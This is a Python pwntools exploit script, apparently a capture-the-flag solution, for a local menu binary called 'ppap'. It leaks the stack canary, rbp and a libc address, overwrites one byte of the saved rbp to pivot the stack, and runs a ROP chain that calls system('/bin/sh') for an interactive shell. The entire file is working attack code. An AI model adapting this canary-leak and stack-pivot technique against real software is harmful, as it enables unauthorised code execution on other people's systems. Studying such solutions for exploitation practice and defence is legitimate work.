from pwn import *

def add(data, choice):
    p.sendlineafter('choice :', '1')
    p.sendafter('add?', data)
    p.sendlineafter(': ', str(choice))

def show():
    p.sendlineafter('choice :', '2')

def eat():
    p.sendlineafter('choice :', '3')

def bye():
    p.sendlineafter('choice :', '4')

def exp():
    #leak canary and rbp
    add('a'*0x29, 2)
    p.recvuntil('a'*0x28)
    canary = u64(p.recv(8))-ord('a')
    success('canary = 0x%x', canary)
    rbp = u64(p.recv(6).ljust(8, b'\x00'))
    success('rbp = 0x%x', rbp)

    # set canary back and overwrite rbp
    one_byte = chr(int(hex(rbp)[-2:], 16)+8+0x40).encode()
    payload = b'a'*0x28 + p64(canary) + one_byte
    print(len(payload))
    if len(payload) != 49:
        return
    p.sendafter('add?', payload)
    p.sendlineafter(': ', '3')

    # leak libc
    show()
    p.recvuntil('fruit: ')
    __libc_start_main = u64(p.recv(6).ljust(8, b'\x00'))
    base = __libc_start_main - 243 - libc.sym['__libc_start_main']
    success('libc base = 0x%x', base)
    if hex(base)[:4] != '0x7f':
        return
    system = base + libc.sym['system']
    sh = base + next(libc.search(b'/bin/sh\x00'))
    
    # overwrite rbp
    if int(hex(rbp)[-2:], 16)-0x18 < 0:
        return
    one_byte = chr(int(hex(rbp)[-2:], 16)-0x18).encode()
    payload = b'a'*0x28 + p64(canary) + one_byte
    print(len(payload))
    add(payload, 3)

    # write return address to rop chain
    pop_rdi = 0x0000000000400b73
    ret = 0x0000000000400290
    payload = p64(pop_rdi) + p64(sh) + p64(ret) + p64(system)
    add(payload, 1)
    p.interactive()
    exit(0)

if __name__ == "__main__":
    # because python3 must use byte and encode() may let one byte become two byte
    # so we need to run the process again and again until no error
    while True:
        p = process('./ppap')
        elf = ELF('./ppap')
        libc = elf.libc
        exp()